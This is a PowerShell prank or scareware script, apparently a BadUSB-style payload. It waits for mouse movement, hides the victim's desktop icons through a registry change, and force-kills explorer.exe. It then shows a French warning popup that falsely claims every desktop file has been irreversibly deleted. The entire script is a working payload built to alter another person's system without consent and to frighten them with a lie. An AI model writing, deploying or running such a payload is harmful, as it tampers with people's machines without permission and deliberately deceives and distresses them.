function Pause-Script {
    Add-Type -AssemblyName System.Windows.Forms

    # Récupérer la position initiale de la souris
    $originalPOS = [System.Windows.Forms.Cursor]::Position

    while ($true) {
        # Récupérer la position actuelle de la souris
        $currentPOS = [System.Windows.Forms.Cursor]::Position

        # Vérifier si la position de la souris a changé
        if ($currentPOS.X -ne $originalPOS.X -or $currentPOS.Y -ne $originalPOS.Y) {
            # Si la souris a bougé, sortir de la boucle
            break
        }
        # Sinon attendre quelques secondes avant de vérifier à nouveau
        Start-Sleep -Seconds 1
    }
}

# Pop Up Message
function MsgBox {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True)]
        [Alias("m")]
        [string]$message,

        [Parameter (Mandatory = $False)]
        [Alias("t")]
        [string]$title,

        [Parameter (Mandatory = $False)]
        [Alias("b")]
        [ValidateSet('OK', 'OKCancel', 'YesNoCancel', 'YesNo')]
        [string]$button,

        [Parameter (Mandatory = $False)]
        [Alias("i")]
        [ValidateSet('None', 'Hand', 'Question', 'Warning', 'Asterisk')]
        [string]$image
    )

    Add-Type -AssemblyName PresentationCore, PresentationFramework

    if (!$title) { $title = " " }
    if (!$button) { $button = "OK" }
    if (!$image) { $image = "None" }

    [System.Windows.MessageBox]::Show($message, $title, $button, $image)
}

# Fonction principale
function Main {
    # Attendre que la souris se déplace
    Pause-Script

    # Hides Desktop Icons
    $Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
    Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1
    Get-Process "explorer" | Stop-Process

    # Affichage du message popup après le mouvement de la souris et la suppression des icônes
    MsgBox -m 'TOUS LES FICHIERS DE VOTRE BUREAU ONT ETE SUPPRIMES AVEC SUCCES. (Vous avez choisi le mode "sans echec", cette action est donc definitive et irreversible)' -t "Suppression de fichiers (mode sans echec)" -b OK -i Warning
}

# Appel à la fonction principale
Main